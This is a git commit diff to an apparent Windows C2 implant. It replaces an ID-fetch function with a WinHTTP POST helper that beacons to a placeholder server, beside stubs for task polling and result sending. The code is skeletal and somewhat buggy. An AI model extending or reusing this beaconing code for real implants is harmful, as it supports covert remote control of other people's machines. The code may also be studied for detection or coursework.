834fd056b1b0522e67ea176b6a3e6b93d12ad5a7
Addison Baum <70862672+addycb@users.noreply.github.com>
2022-12-02 20:11:06 -0500

    Fixed post request

--- Implant/implant.cpp
+++ Implant/implant.cpp
@@ -10,16 +10,11 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #define SERVERNAME "placeholder"
 #define SLEEP 10
 
-
-LPCSTR needthis="winhttp.h";
-HMODULE winhttp=LoadLibraryA(needthis);
-
 size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
 {
     data->append((char *)ptr, size * nmemb);
     return size * nmemb;
 }
-
 
 void tasks()
 {
@@ -29,72 +24,88 @@ void tasks()
     }
 }
 
-int get_id()
-{
-    LPCWSTR postdata = L"mac address, some unique id";
-    DWORD datalen = wcslen(postdata);
-    LPCWSTR uniquedata = L"x";
-    HINTERNET asyncsesh = WinHttpOpen(
+int makePostRequest(LPCWSTR servername, LPCWSTR postdata){
+    DWORD datalen=wcslen(postdata);
+    HINTERNET httpsession = WinHttpOpen(
         L"GenericAPICaller",
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
-        WINHTTP_FLAG_ASYNC);
-    LPCWSTR servername = L"google.com";
-    if (asyncsesh != NULL)
-    {
+        0);
+    if(httpsession!=NULL){
+        //std::cout<<"Session Started\n";
         HINTERNET connectsesh = WinHttpConnect(
-            asyncsesh,
+            httpsession,
             servername,
             INTERNET_DEFAULT_HTTPS_PORT,
             0);
         if (connectsesh != NULL)
         {
+            //std::cout<<"connect \n";
             HINTERNET request = WinHttpOpenRequest(
                 connectsesh,
                 L"POST",
-                L"get_id",
+                L"/post",
                 NULL,
                 WINHTTP_NO_REFERER,
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                 WINHTTP_FLAG_SECURE);
             if (request != NULL)
             {
+                //std::cout<<"request \n";
                 BOOL idrequest = WinHttpSendRequest(
                     request,
                     WINHTTP_NO_ADDITIONAL_HEADERS,
                     0,
                     (LPVOID)postdata,
                     datalen,
-                    0,
+                    datalen,
                     0);
                 if (idrequest == TRUE)
                 {
+                    //std::cout<<"sendrequest \n";
                     BOOL response = WinHttpReceiveResponse(
                         request,
                         NULL);
+                    if(response==true)
+                    {
+                        //std::cout<<"receiveresponse \n";
+                        DWORD bytesneeded;
+                        BOOL query= WinHttpQueryDataAvailable(
+                        request,
+                        &bytesneeded);
+                        //char *returnbuffer = (char *)malloc((size_t)bytesneeded);
+                        LPSTR returnbuffer=new char[(bytesneeded+1)];
+                        if(query==TRUE){
+                            if(returnbuffer){
+                                ZeroMemory(returnbuffer, bytesneeded+1);
+                                std::cout<<"Returnbuffer created.";
+                                std::cout<<"queryavailable \n";
+                                BOOL dataread=WinHttpReadData(
+                                request,
+                                returnbuffer,
+                                16,
+                                NULL);
+                                if(dataread==TRUE){
+                                    //std::cout<<"dataread \n";
+                                    std::cout << returnbuffer;
+                                    return 0;
+                                }
+                            }
+                        }
+                    }
                 }
-                LPDWORD bytesneeded;
-                WinHttpQueryDataAvailable(
-                    request,
-                    bytesneeded);
-                char *returnbuffer = (char *)malloc((size_t)bytesneeded);
-                WinHttpReadData(
-                    request,
-                    returnbuffer,
-                    *bytesneeded,
-                    NULL);
-                std::cout << returnbuffer;
-                return 0;
             }
         }
     }
-    return 0;
+return -1;
 }
+
 
 int sendresults()
 {
-    while (1){
+    while (1)
+    {
         Sleep(SLEEP);
         // Send results, check response
         // If good response break
@@ -129,13 +140,7 @@ char *make_base_payload(char *implant_id)
 int main(int argc, char *argv[])
 {
 
-    // char blah[33];
-    // strcpy(blah, random_id());
-    // printf("%s\n", blah);
 
-    // register_();
 
-    get_id();
-
-    return 0;
+return 0;
 }
